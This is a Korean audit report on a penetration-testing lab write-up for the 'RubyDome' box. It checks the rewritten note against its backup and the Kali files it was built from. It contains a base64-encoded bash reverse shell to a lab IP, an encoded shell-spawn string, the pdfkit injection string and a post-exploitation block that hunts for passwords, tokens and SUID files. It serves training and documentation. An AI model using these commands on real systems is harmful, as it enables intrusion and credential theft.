---
tags:
  - type/audit
  - platform/pg
manual_tags: true
---
# RubyDome — 적대적 검증 (웨이브 14)

대상: `03. PG\RubyDome.md` (개작 후 623행) · 원본 `03. PG\_backup\RubyDome.md.bak2` (1005행)
이관 제안: `03. PG\_AUDIT\RubyDome-playbook.md` (14건)
증거원: Kali `~/PG/RubyDome/` · `/tmp/pk/` · `/tmp/cptest/` · `~/.zsh_history` · `.bak2` 라인 대조

---

## 1. 고친 것

| 위치(문자열) | 무엇이 틀렸나 | 어떻게 고쳤나 |
|---|---|---|
| 코드펜스 `` app.rb:35:in `block in ' `` (err.html 발췌 블록) | **실측 파괴.** `err.html` 4행 원문은 ``app.rb:35:in `block in <main>'`` 임. 개작 과정에서 `<main>` 이 사라짐 | 원문대로 `<main>` 복원 |
| 표 행 `` `app.rb:35:in 'block in '` `` (「읽히는 것/근거」 표) | 같은 개변이 표에도 전파됨. 인라인 코드라 백틱 충돌을 피하려 `'` 로 대체돼 있었음 | 이중 백틱 인라인 코드로 `` ``app.rb:35:in `block in <main>'`` `` 복원 |
| 산문 「`err.html` 의 `app.rb:35:in 'block in '` 가 …」(`앱 소스` `[가정]` 절) | 같은 개변의 3번째 전파 | 동일하게 복원 |
| 캡션 「(HTML 태그 제거 후. 프레임 45개 중 층을 대표하는 6개만 발췌)」 | **두 곳이 사실과 다름.** ① `err.html` 은 **평문**이고 HTML 태그가 **0개**임(`grep -o '<[a-zA-Z/!][^>]*>'` 결과가 `<main>` 1건뿐이며 그것은 Ruby 백트레이스 텍스트). 「태그 제거」를 한 적이 없고, 그 오해가 위 `<main>` 삭제의 원인으로 보임 ② 파일은 45행이고 1행이 예외 메시지이므로 **프레임은 44개** | 「45행 = 예외 1행 + 프레임 44행. 그중 각 층을 대표하는 1·2·3·4·31·44행 발췌. 원문은 평문이라 태그 제거를 하지 않았고, `<main>` 은 HTML 태그가 아니라 Ruby 백트레이스의 일부임」 |

**정정 4건. 삭제 0건.**

---

## 2. 삭제한 것

**없음.** 이번 감사에서 노트 본문에서 지운 서술은 없음.

---

## 3. 반증한 것 — 지적으로 올랐다가 확인 결과 노트가 옳았던 것

### 3-1. 관리자 표본 대조의 문자열 빈도 감소 3건 — **전부 손실 아님**

| 문자열 | bak2 → 노트 | 판정 |
|---|---|---|
| `nmap` 8 → 5 | nmap 플래그 6종 해설표(`-p-`·`-sCV`·`-Pn`·`-A`·`--min-rate`·`-oN`)가 제안 **P14** 로 이관됨. 노트에는 명령 1 + 로그 헤더 2 + 산문 2가 남음 | **이관. 손실 아님** |
| `base64` 20 → 15 | §6④(c)(`-w0` 누락 함정)와 §7-7(일반화)이 제안 **P10**(`B-81`)으로 이관됨. `-w0`·`echo -n` 의 **인과는 노트에 그대로 남아 있음** | **이관. 손실 아님** |
| `gem unpack` 4 → 3 | 언어별 원본 확보 명령 4줄 코드블록이 산문 한 줄(`gem fetch`/`gem unpack`(Ruby) · `pip download --no-deps --no-binary :all:`(Python) · `npm pack`(Node) · `mvn dependency:get`(Java))로 압축됨. **4개 언어 전부 보존** | **압축. 정보 손실 아님** |

### 3-2. 「타겟 pty 프롬프트 17곳」 — 실제로는 **16곳**이고 전량 보존됨

- `.bak2` 의 `root@rubydome` 6건 중 **1건은 프롬프트가 아니라 산문**(§5 의 「이 박스는 프롬프트에 `root@rubydome`이 보이지만 …」). 그 장이 이관되며 함께 나감
- 실제 pty 프롬프트는 `andrew@rubydome` 11 + `root@rubydome` 5 = **16곳**
- 프롬프트 줄 전문을 `.bak2` 와 정렬 대조: **`ANDREW PROMPTS IDENTICAL` · `ROOT PROMPTS IDENTICAL`** — 16/16 바이트 동일

### 3-3. 「`Connection to <host> closed.` 는 pty 할당의 증거다」 — **이 노트에는 존재한 적이 없음**

`.bak2`·노트 양쪽에서 `grep 'Connection to\|closed\.'` **0건**. 보존할 대상이 아니었음.

### 3-4. Kali 프롬프트 제거의 «근거»는 지시받은 것보다 약함 — 다만 **결론은 유지**

- 지시: 「`~/.zsh_history` 에 `rubydome` 0건(히스토리는 Aug 25 까지 생존)」
- 재확인: `rubydome`·`pdfkit` 0건은 맞음. `192.168.248.22` 매치는 전부 `…248.222`(다른 박스)의 부분일치임
- **그러나 이 히스토리 파일에는 `EXTENDED_HISTORY` 타임스탬프가 없다**(`grep -oE '^: [0-9]{10}'` **0건**). 즉 파일 mtime 이 Aug 25 라는 것만 알 뿐 **가장 오래된 항목이 2026-08-19 를 덮는지 확정할 수 없음.** 부재 논증의 등급은 `근거부족` 이 상한
- **그럼에도 제거는 정당함 — 근거가 다름.** 9개 블록이 **사라진 것이 아니라** 「명령 펜스 + 출력 펜스 + 출처 캡션」(STANDARD 가 규정한 형태 1·2)으로 재배치됐고, 안에 든 명령·출력이 전부 보존됐음을 아래 4장에서 바이트 대조로 확인함. **블록 소멸 0건**

### 3-5. `err.html` grep 명령이 원본과 «다른» 것 — 개변이 아니라 **정정**

`.bak2` 는 `curl -s -X POST -d 'x=1' … | grep -oE …` 로 적고 그 출력으로 `NoMethodError` 트레이스를 실었으나, **저장된 `err.html` 은 `ImproperWkhtmltopdfExitStatus` 라 그 요청의 산물이 아님**(원본 노트도 스스로 `[가정]` 으로 유보했음). 개작본이 실제 파일을 grep 하는 형태로 바꾼 것은 날조 제거이지 실측 훼손이 아님.

### 3-6. 「깊이 초과」로 올렸던 패치 대조 절 — **유지 판정**

`0.8.6→0.8.7→0.8.7.2` `diff` 두 hunk 는 STANDARD 가 과잉으로 든 「버전별 소스 계보」에 형식상 걸림. 그러나 ⓐ 실측이고(아래 재현 확인) ⓑ `Vulnerability Fix:` 의 **「`0.8.7` 이 아니라 `>= 0.8.7.2`」를 심사관이 납득할 유일한 근거**이며 ⓒ 검증된 내용을 휴리스틱으로 지우는 것이 §8 의 「삭제는 마지막 수단」에 어긋남. **총괄 판단 대상으로만 올림.**

---

## 4. 실측 대조 — 노트의 주장을 직접 때려본 결과

전부 **일치**. 날조 0건.

| 노트의 주장 | 확인 방법 | 결과 |
|---|---|---|
| nmap raw 블록 | 노트 67–94행 ↔ `~/PG/RubyDome/nmap.log` `diff` | **바이트 동일**(차이는 닫는 펜스 1줄뿐) |
| gem 버전 5줄 | `grep -oE 'gems/[a-z-]+-[0-9.]+' err.html \| sort -u` | 5줄 그대로 재현 |
| `err.html` 첫 줄 wkhtmltopdf 명령행 (`"http://%20%60id%60"`) | `head -c 700 err.html` | 일치 |
| `sed -n '39p;100p' gemsrc/pdfkit-0.8.6/lib/pdfkit/pdfkit.rb` 출력 2줄 | 직접 실행 | 일치 |
| `ruby -e 'require "./lib/pdfkit/source"; …'` 출력 2줄 | `~/PG/RubyDome/gemsrc/pdfkit-0.8.6/` 에서 직접 실행 | **일치** — `"http:// \`id\`" -> "http://%20%60id%60"` 재현 |
| `/tmp/pk/` 3버전 전개본 | `ls -la /tmp/pk/` | 0.8.6·0.8.7·0.8.7.2 전개본 + gem 3개 존재 |
| `diff` 두 hunk (`49c49` · `32c32`+`44c44`) | `/tmp/pk` 에서 직접 diff | **행번호까지 일치** |
| `/tmp/cptest/` `cp`/`mv` 소유권 실측 | `ls -la /tmp/cptest/` | `f`(kali) · `f2`(root) · `n`(kali) — 콜아웃 표와 정합 |
| `ZXhlYyAiL2Jpbi9iYXNoIg==` 디코드 | `base64 -d` | `exec "/bin/bash"` |
| `rd.sh` 페이로드의 base64 | `echo -n 'bash -i >& …' \| base64 -w0` | `YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy80NDQ0IDA+JjE=` 일치 |
| `rd.sh` 전문 · 플래그 6종 표 | `cat ~/PG/RubyDome/rd.sh` | 전문 일치, 319B·17:54:47 일치 |
| 「`dirb/common.txt`(4614행)」 | `wc -l /usr/share/dirb/wordlists/common.txt` | **4614** |
| 「GNU `base64` 는 76자마다 개행」 | Kali 실행 | **76** |
| `gobuster.txt`(17:48:21)·`gobuster_common.txt`(17:59:15) 0바이트 | `ls -la --time-style=full-iso` | 일치. 노트가 「빈 파일」이 아니라 **「0건과 정합적이나 완주/중단은 구분 안 됨」**으로 `[가정]` 유보를 붙여 살려 둠 |
| Post-Exploitation 「전수」 파일 목록 12건 | 디렉터리 실물 | 일치(누락·허위 0) |
| `[[_PLAYBOOK#…]]` 앵커 7개 | `_PLAYBOOK.md` 헤딩 대조 | **7/7 실재** |

---

## 5. 이관 손실 — **1건**

제안 파일의 「검산」(하위 단위 14개 = 제안 14건)을 믿지 않고 `.bak2` 를 직접 훑어 대조함. **13건은 ④ 원문 인용과 함께 제안에 실재**하나 아래 1건이 빠짐.

### L-1. §6⑤C 「`sudo -l`이 비어 있었다면」 — 제안 어디에도 없음

검산표는 §6⑤ 를 「A/B/C → P8 · P4」로 매핑했으나 **C 는 어느 제안에도 들어가지 않았다.** 제안 전문에서 `rniE`·`bash_history`·`perm -4000`·`ps aux --forest` 0건, `getcap` 0건.

**지우기 전 원문(복원용):**

````markdown
**C. `sudo -l`이 비어 있었다면**

`groups=…,27(sudo)` 는 남아 있으므로 andrew의 비밀번호를 얻는 순간 끝난다. 그 경우의 탐색 순서:

```bash
grep -rniE 'password|passwd|secret|token|api[_-]?key' /home/andrew /var/www 2>/dev/null
ls -la /home/andrew                       # dotfile·history
cat ~/.bash_history 2>/dev/null
find / -perm -4000 -type f 2>/dev/null    # SUID
getcap -r / 2>/dev/null                   # capabilities
cat /etc/crontab; ls -la /etc/cron.*      # 크론
ps aux --forest                           # root로 도는 프로세스
ss -tlnp                                  # 외부에 안 열린 로컬 서비스
```
````

**인과가 박스 고유임** — 「`sudo -l` 규칙을 못 찾았어도 `groups=…,27(sudo)` 가 남으므로 **비밀번호 탐색으로 분기**한다」가 요지이고, 그 분기 판단이 이 항목의 값. 일반 열거 체크리스트로만 읽고 버리면 인과가 사라짐.
`_PLAYBOOK` 반영은 단독 기록자 몫이라 여기 근거만 남김.

### 손실 아닌 것으로 판정한 2건

| 원본 | 판정 |
|---|---|
| `echo "hello \`id\`"` 셸 데모 3줄 | 그 블록이 가르치던 사실(쌍따옴표 안에서 `` ` ``·`$( )` 는 살고 `;`·`\|` 는 죽음)이 노트 산문에 **그대로 남음**. 데모는 예시이지 실측이 아님 |
| §6⑤C 외 나머지 13단위 | 제안 P1–P14 에 **④ 원문 인용과 함께** 실재. 하나씩 열어 확인함 |

---

## 6. 구조·색인 점검

| 항목 | 결과 |
|---|---|
| `Vulnerability Explanation:` / `Fix:` / `Severity:` / `Steps to reproduce the attack:` | **각 2건** — `Initial Access`·`Privilege Escalation` 양쪽 완비 |
| 4항목 안의 「아래」·「위」 상대 참조 | **0건** |
| `Port Scan Results` 표 | 있음 |
| nmap raw PORT 라인 (`22/tcp   open  ssh` · `3000/tcp open  http`) | 보존 — `PORT_RE` 가 22·3000 을 긁음 |
| 두 `Initial Access` 제목 | 다름(긴 서술형 / 짧은 형) |
| 헤딩 레벨 | `## Target #1` 아래 전부 `###` |
| 코드펜스 언어 태그 | 펜스 56줄(여는 28 / 닫는 28) **전부 태그 있음. 무태그 0** |
| 플래그 2개 | `1a896874…`(local) · `9fdc8077…`(proof) 각 2회, 값 무손실 |
| 프론트매터 | `manual_tags: true` · `manual_cves: true` 둘 다 있음. `tech/*` 3개(cmd-injection·sudo-abuse·revshell)는 전부 실사용 기법. `cves: [CVE-2022-25765]` 1개 = 실제 악용 CVE |
| 「응답이 성공을 뜻하지 않는다」 인과 | 노트에 남음(`HTTP=000` 판정표 + `HTTP=200` + 정상 PDF = 조용한 실패) |
| 「`sudo -l` 이 좁아도 대상 파일 권한을 확인」 인과 | 노트에 남음(sudoers 규칙 4형 표 + 「그 명령이 무엇을 읽는가」) |
| 정정 이력 콜아웃이 본문에 있는가 | **없음** — 규율대로 이 파일에만 있음 |
| 본문에 `_AUDIT`·`-playbook` 경로 언급 | **0건** |

**색인 갱신 필요** — 본문 편집이 있었으므로 `refresh.ps1` 대상. (감사자는 실행하지 않음. 총괄 몫)

---

## 7. 총괄 판단이 필요한 것

1. **이관 손실 L-1** — §6⑤C 를 `_PLAYBOOK` 어느 절에 넣을지. `A-43`(`sudo -l` 이 좁아도…) 옆의 형제 항목 또는 `C-2` 계열이 자연스러움. 단독 기록자 몫이라 감사자가 손대지 않음
2. **패치 대조 절(3-6)** — 깊이 기준상 경계. 유지 판정했으나 총괄이 뒤집을 수 있음
3. **`_STATUS.md` 판정** — RubyDome = **완료 2/2**(local `1a896874eca026e3e0e2cd07a550d25f` · proof `9fdc8077f413eac85c2f5b624548a8c2`). 단 두 값 모두 **이전 침투 세션 확보분이고 이 세션에서 재확인 불가**(타겟 정지)이며 `proof_*.txt` 형식 증거 파일과 스크린샷이 **0건**임 — 노트가 그 사실을 `[가정]` 으로 명시하고 있음
